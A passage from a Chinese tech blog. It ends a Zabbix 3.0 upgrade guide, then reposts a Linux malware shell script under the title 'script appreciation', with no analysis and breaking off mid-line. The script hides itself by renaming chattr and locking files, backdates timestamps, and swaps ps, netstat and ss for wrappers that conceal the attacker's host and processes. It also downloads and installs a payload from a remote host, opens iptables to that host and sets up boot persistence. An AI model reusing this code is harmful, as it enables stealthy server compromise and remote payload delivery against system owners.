<h5 id="2，zabbix3-0源码包还是rpm也是根据个人爱好"><a href="#2，zabbix3-0源码包还是rpm也是根据个人爱好" class="headerlink" title="2，zabbix3.0源码包还是rpm也是根据个人爱好"></a>2，zabbix3.0源码包还是rpm也是根据个人爱好</h5><p>升级centos6的zabbix官方yum源（官方yum源没有提供CentOS6版本的zabbix3.0 server） rpm -Uvh <a target="_blank" rel="noopener" href="http://repo.zabbix.com/zabbix/3.0/rhel/6/x86/_64/zabbix-release-3.0-1.el6.noarch.rpm">http://repo.zabbix.com/zabbix/3.0/rhel/6/x86\_64/zabbix-release-3.0-1.el6.noarch.rpm</a> 下载itnihao打包好的CentOS6版本的zabbix3.0 rpm包，感谢itnihao奉献 mkdir &#x2F;data cd &#x2F;data yum install git createrepo -y git clone <a target="_blank" rel="noopener" href="https://github.com/zabbixcn/zabbix3.0-rpm.git">https://github.com/zabbixcn/zabbix3.0-rpm.git</a> 创建zabbix3.0本地yum源 createrepo &#x2F;data&#x2F;zabbix3.0-rpm&#x2F;RPMS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/yum.repos.d/zabbix3.0.repo &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">[zabbix3.0]</span><br><span class="line">name=zabbix3.0 itnihao</span><br><span class="line">baseurl=file:///data/zabbix3.0-rpm/RPMS</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>重建yum缓存 yum clean all yum makecache yum安装zabbix3.0相关服务（注意：要禁止epel源） yum –disablerepo&#x3D;epel –enablerepo&#x3D;zabbix3.0 install zabbix-server-mysql zabbix-agent zabbix-get zabbix-sender zabbix-web zabbix-web-mysql zabbix-release</p>
<h5 id="3，导入数据"><a href="#3，导入数据" class="headerlink" title="3，导入数据"></a>3，导入数据</h5><p>mysql -u root password ‘password’ &lt; zabbix.nohistory0.sql</p>
<h5 id="4，启动zabbix-server"><a href="#4，启动zabbix-server" class="headerlink" title="4，启动zabbix-server"></a>4，启动zabbix-server</h5><p>service zabbix-server start 此时会自动更新zabbix数据库</p>
<h5 id="5，设置web端"><a href="#5，设置web端" class="headerlink" title="5，设置web端"></a>5，设置web端</h5><p>这里主要是有个字体，需要注意下，默认打开图形乱码，下载简体字。上传，修改代码。 vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php :%s&#x2F;graphfont&#x2F;DejaVuSans&#x2F;g</p>
<p>另外注意下，3.0版本的zabbix-server配置文件和2.4.5的有些不一样，我这里参考3.0的默认修改，结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LogFile=/var/log/zabbix/zabbix_server.log</span><br><span class="line">LogFileSize=0</span><br><span class="line">PidFile=/var/run/zabbix/zabbix_server.pid</span><br><span class="line">DBHost=localhost</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=password</span><br><span class="line">StartPollers=160</span><br><span class="line">StartIPMIPollers=1</span><br><span class="line">StartPollersUnreachable=80</span><br><span class="line">StartTrappers=20</span><br><span class="line">StartPingers=100</span><br><span class="line">StartDiscoverers=120</span><br><span class="line">StartHTTPPollers=2</span><br><span class="line">StartSNMPTrapper=1</span><br><span class="line">CacheSize=1024M</span><br><span class="line">StartDBSyncers=16</span><br><span class="line">TrendCacheSize=1024M</span><br><span class="line">TrapperTimeout=30</span><br><span class="line">FpingLocation=/usr/sbin/fping</span><br><span class="line">DBSocket=/var/lib/mysql/mysql.sock</span><br><span class="line">SNMPTrapperFile=/var/log/snmptrap/snmptrap.log</span><br><span class="line">Timeout=10</span><br><span class="line">AlertScriptsPath=/usr/lib/zabbix/alertscripts</span><br><span class="line">ExternalScripts=/usr/lib/zabbix/externalscripts</span><br><span class="line">LogSlowQueries=3000</span><br></pre></td></tr></table></figure>

<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h3><p>后来又升级一台，备份数据库时没有备份history,history_unit这两个数据库，也没先导入架构表，直接导入趋势数据，所有操作完后，查看zabbix-server.log发现数据不能插入历史数据表。后处理如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `history` (</span><br><span class="line">        `itemid`                 bigint unsigned                           NOT NULL,</span><br><span class="line">        `clock`                  integer         DEFAULT &#x27;0&#x27;               NOT NULL,</span><br><span class="line">        `value`                  double(16,4)    DEFAULT &#x27;0.0000&#x27;          NOT NULL,</span><br><span class="line">        `ns`                     integer         DEFAULT &#x27;0&#x27;               NOT NULL</span><br><span class="line">) ENGINE=InnoDB;</span><br><span class="line">CREATE INDEX `history_1` ON `history` (`itemid`,`clock`);</span><br><span class="line">CREATE TABLE `history_uint` (</span><br><span class="line">        `itemid`                 bigint unsigned                           NOT NULL,</span><br><span class="line">        `clock`                  integer         DEFAULT &#x27;0&#x27;               NOT NULL,</span><br><span class="line">        `value`                  bigint unsigned DEFAULT &#x27;0&#x27;               NOT NULL,</span><br><span class="line">        `ns`                     integer         DEFAULT &#x27;0&#x27;               NOT NULL</span><br><span class="line">) ENGINE=InnoDB;</span><br><span class="line">CREATE INDEX `history_uint_1` ON `history_uint` (`itemid`,`clock`);</span><br></pre></td></tr></table></figure>

<p>就是新建这两个表，这样就不需要再重新导入一次数据了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/18/2018/12/2018-12-18-%E8%84%9A%E6%9C%AC%E6%AC%A3%E8%B5%8F%E4%B9%8B%E7%A6%BD%E5%85%BD%E5%A4%A7%E4%BA%BA%E7%9A%84%E6%9D%B0%E4%BD%9C/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/18/2018/12/2018-12-18-%E8%84%9A%E6%9C%AC%E6%AC%A3%E8%B5%8F%E4%B9%8B%E7%A6%BD%E5%85%BD%E5%A4%A7%E4%BA%BA%E7%9A%84%E6%9D%B0%E4%BD%9C/index/" class="post-title-link" itemprop="url">脚本欣赏之禽兽大人的杰作</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-18 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-18T08:00:00+08:00">2018-12-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dev/" itemprop="url" rel="index"><span itemprop="name">dev</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment">#chkconfig:12345 90 90</span></span><br><span class="line"><span class="comment">#############################################</span></span><br><span class="line"><span class="comment">#############################################</span></span><br><span class="line"><span class="comment">#############################################</span></span><br><span class="line"><span class="comment">#############################################</span></span><br><span class="line"><span class="comment">#############################################</span></span><br><span class="line">path=`<span class="built_in">pwd</span>`</span><br><span class="line">exit0=<span class="string">&quot;exit 0&quot;</span></span><br><span class="line">Fss=<span class="string">&quot;/usr/bin/.Fss&quot;</span></span><br><span class="line">Fps=<span class="string">&quot;/usr/bin/.Fps&quot;</span></span><br><span class="line">Fnet=<span class="string">&quot;/usr/bin/.Fnetstat&quot;</span></span><br><span class="line">LockAngel=<span class="string">&quot;/usr/bin/zfgsr&quot;</span></span><br><span class="line">Fssbak=<span class="string">&quot;/usr/bin/dpkgd/ss&quot;</span></span><br><span class="line">Fpsbak=<span class="string">&quot;/usr/bin/dpkgd/ps&quot;</span></span><br><span class="line">Fnetbak=<span class="string">&quot;/usr/bin/dpkgd/netstat&quot;</span></span><br><span class="line">MyFileAngel=<span class="string">&quot;/etc/init.d/.dbus-daemon--system&quot;</span></span><br><span class="line">PuppetAngel=<span class="string">&quot;/usr/bin/.dbus-daemon--system.bak&quot;</span></span><br><span class="line">allow=<span class="string">&quot;/etc/allow.bak&quot;</span></span><br><span class="line">Fconfig=<span class="string">&quot;/sbin/Fconfig.n&quot;</span></span><br><span class="line">S99=<span class="string">&quot;/etc/rc.d/init.d/S99.25000&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f  <span class="string">&quot;<span class="variable">$Fconfig</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> byqinshou 995999349 &gt; <span class="variable">$Fconfig</span></span><br><span class="line">zfgsr +ia <span class="variable">$Fconfig</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Address1=`nslookup www.120kongbao.com|grep <span class="string">&quot;Address: &quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$Address1</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">zfgsr -ia /etc/resolv.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nameserver 114.114.114.114&#x27;</span>&gt;/etc/resolv.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nameserver 8.8.8.8&#x27;</span>&gt;&gt;/etc/resolv.conf</span><br><span class="line"><span class="built_in">touch</span> -d <span class="string">&quot;2010-06-7 08:10:30&quot;</span>  /etc/resolv.conf</span><br><span class="line">zfgsr +ia /etc/resolv.conf</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ftempbash=`<span class="built_in">cat</span> <span class="variable">$Fconfig</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`   <span class="comment">#现脚本文件名</span></span><br><span class="line">Fbashtemp=<span class="string">&quot;/usr/bin/&quot;</span><span class="variable">$Ftempbash</span> <span class="comment">#现脚本路径</span></span><br><span class="line">Fbashname=`<span class="built_in">date</span> +%s%N | <span class="built_in">md5sum</span> | <span class="built_in">head</span> -c 10`</span><br><span class="line">Fbashpath=<span class="string">&quot;/usr/bin/&quot;</span><span class="variable">$Fbashname</span> <span class="comment">#新脚本路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$0</span> != <span class="string">&quot;<span class="variable">$Fbashtemp</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">pkill <span class="variable">$Ftempbash</span>;killall <span class="variable">$Ftempbash</span></span><br><span class="line">zfgsr -ia /usr/bin/<span class="variable">$Ftempbash</span>;<span class="built_in">rm</span> -f /usr/bin/<span class="variable">$Ftempbash</span></span><br><span class="line">zfgsr -ia <span class="variable">$PuppetAngel</span>;<span class="built_in">rm</span> -f <span class="variable">$PuppetAngel</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f  <span class="string">&quot;<span class="variable">$LockAngel</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">zfgsr -ia <span class="variable">$LockAngel</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$LockAngel</span></span><br><span class="line"><span class="built_in">cp</span> -f /usr/bin/chattr <span class="variable">$LockAngel</span></span><br><span class="line"><span class="built_in">cp</span> -f /usr/bin/chattr /usr/bin/.zfgsr</span><br><span class="line"><span class="built_in">cp</span> -f /usr/bin/.zfgsr <span class="variable">$LockAngel</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="variable">$LockAngel</span></span><br><span class="line"><span class="built_in">chmod</span> 777 /usr/bin/.zfgsr</span><br><span class="line"><span class="built_in">touch</span> -d <span class="string">&quot;2011-06-7 08:10:30&quot;</span>  <span class="variable">$LockAngel</span></span><br><span class="line"><span class="built_in">touch</span> -d <span class="string">&quot;2011-06-7 08:10:30&quot;</span>  /usr/bin/.zfgsr</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/bin/chattr</span><br><span class="line">zfgs +ia <span class="variable">$LockAngel</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /usr/sbin/ss ];<span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$Fss</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$Fssbak</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">mkdir</span> /usr/bin/dpkgd/</span><br><span class="line"><span class="built_in">cp</span> -f /usr/sbin/ss <span class="variable">$Fssbak</span></span><br><span class="line"><span class="built_in">cp</span> -f /usr/sbin/ss <span class="variable">$Fss</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cp</span> -f <span class="variable">$Fssbak</span> <span class="variable">$Fss</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">zfgsr -ia /usr/sbin/ss</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/ss</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /usr/sbin/ss</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;.Fss|grep -v &quot;&#x27;</span><span class="variable">$Address1</span><span class="string">&#x27;&quot;&#x27;</span> &gt;&gt; /usr/sbin/ss</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exit&#x27;</span> &gt;&gt; /usr/sbin/ss</span><br><span class="line"><span class="built_in">chmod</span> 0755 <span class="variable">$Fss</span>;<span class="built_in">chmod</span> 0755 /usr/sbin/ss</span><br><span class="line">zfgsr +ia /usr/sbin/ss &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">zfgsr +ia <span class="variable">$Fssbak</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">zfgsr +ia <span class="variable">$Fss</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /bin/netstat ];<span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$Fnet</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$Fnetbak</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">mkdir</span> /usr/bin/dpkgd/</span><br><span class="line"><span class="built_in">cp</span> -f /bin/netstat <span class="variable">$Fnetbak</span></span><br><span class="line"><span class="built_in">cp</span> -f /bin/netstat <span class="variable">$Fnet</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cp</span> -f <span class="variable">$Fnetbak</span> <span class="variable">$Fnet</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">zfgsr -ia /bin/netstat</span><br><span class="line"><span class="built_in">rm</span> -rf /bin/netstat</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /bin/netstat</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;for arg in &quot;$*&quot;;do&#x27;</span> &gt;&gt; /bin/netstat</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;.Fnetstat $arg|grep -v &quot;&#x27;</span><span class="variable">$Address1</span><span class="string">&#x27;&quot;;done;exit&#x27;</span> &gt;&gt; /bin/netstat</span><br><span class="line"><span class="built_in">chmod</span> 0755 <span class="variable">$Fnet</span>;<span class="built_in">chmod</span> 0755 /bin/netstat</span><br><span class="line">zfgsr +ia /bin/netstat &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">zfgsr +ia <span class="variable">$Fnetbak</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">zfgsr +ia <span class="variable">$Fnet</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /bin/ps ];<span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$Fps</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$Fpsbak</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">mkdir</span> /usr/bin/dpkgd/</span><br><span class="line"><span class="built_in">cp</span> -f /bin/ps <span class="variable">$Fpsbak</span></span><br><span class="line"><span class="built_in">cp</span> -f /bin/ps <span class="variable">$Fps</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cp</span> -f <span class="variable">$Fpsbak</span> <span class="variable">$Fps</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">zfgsr -ia /bin/ps</span><br><span class="line"><span class="built_in">rm</span> -rf /bin/ps</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /bin/ps;<span class="built_in">echo</span> <span class="string">&#x27;for arg in &quot;$*&quot;;do&#x27;</span> &gt;&gt; /bin/ps</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;.Fps $arg|grep -v &quot;&#x27;</span>.dbus-daemon--system<span class="string">&#x27;&quot;|grep -v &quot;&#x27;</span><span class="variable">$Fbashname</span><span class="string">&#x27;&quot;|grep -v &quot;ps&quot;|grep -v &quot;grep&quot;;done;exit&#x27;</span> &gt;&gt; /bin/ps</span><br><span class="line"><span class="built_in">chmod</span> 0755 <span class="variable">$Fps</span>;<span class="built_in">chmod</span> 0755 /bin/ps</span><br><span class="line">zfgsr +ia /bin/ps &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">zfgsr +ia <span class="variable">$Fpsbak</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">zfgsr +ia <span class="variable">$Fps</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f  <span class="string">&quot;<span class="variable">$allow</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">cp</span> -f /etc/hosts.allow <span class="variable">$allow</span></span><br><span class="line">zfgsr +ia <span class="variable">$allow</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># by qinshou -----------------------------------------------</span></span><br><span class="line">ExistAngel=`.Fps aux | grep .dbus-daemon--system | grep -v <span class="string">&quot;grep&quot;</span> |<span class="built_in">wc</span> -l`</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$ExistAngel</span> != 1 ];<span class="keyword">then</span></span><br><span class="line">zfgsr -ia /usr/bin/.dbus-daemon--system</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/bin/.dbus-daemon--system</span><br><span class="line"><span class="built_in">cp</span> -f /usr/bin/.dbus-daemon--system.bak /usr/bin/.dbus-daemon--system</span><br><span class="line"><span class="built_in">chmod</span> 777 /usr/bin/.dbus-daemon--system</span><br><span class="line">/usr/bin/.dbus-daemon--system</span><br><span class="line">  <span class="built_in">rm</span> -rf /usr/bin/.dbus-daemon--system</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f  <span class="string">&quot;<span class="variable">$MyFileAngel</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">  zfgs -i /usr/bin/wget</span><br><span class="line">  zfgs -a /usr/bin/wget</span><br><span class="line"><span class="built_in">chmod</span> 777 /usr/bin/wget</span><br><span class="line">wget -P /etc/ http://www.120kongbao.com:999/1000.exe</span><br><span class="line">zfgs -i <span class="variable">$MyFileAngel</span></span><br><span class="line">zfgs -a <span class="variable">$MyFileAngel</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$MyFileAngel</span></span><br><span class="line"><span class="built_in">chmod</span> 777 /etc/1000.exe</span><br><span class="line"><span class="built_in">mv</span> -f /etc/1000.exe <span class="variable">$MyFileAngel</span></span><br><span class="line">zfgs +i <span class="variable">$MyFileAngel</span></span><br><span class="line">zfgs +a <span class="variable">$MyFileAngel</span></span><br><span class="line"><span class="built_in">chmod</span> 0 /usr/bin/wget</span><br><span class="line">zfgs +i /usr/bin/wget</span><br><span class="line">zfgs +a /usr/bin/wget</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f  <span class="string">&quot;<span class="variable">$PuppetAngel</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">cp</span> -f <span class="variable">$MyFileAngel</span> <span class="variable">$PuppetAngel</span></span><br><span class="line">zfgs +i <span class="variable">$PuppetAngel</span></span><br><span class="line">zfgs +a <span class="variable">$PuppetAngel</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iptable=`iptables -L INPUT|grep <span class="variable">$Address1</span>|awk <span class="string">&#x27;&#123;print $1 $4&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$iptable</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">iptables -I INPUT -s <span class="variable">$Address1</span> -j ACCEPT</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">iptables -D INPUT -s <span class="variable">$Address1</span> -j DROP</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 自启动------------------</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f  <span class="string">&quot;<span class="variable">$S99</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/bin/sh&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# chkconfig: 12345 90 90&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# description: <span class="variable">$Ftempbash</span>&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;### BEGIN INIT INFO&quot;</span> &gt;&gt; <span class="variable">$S99</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Provides:   <span 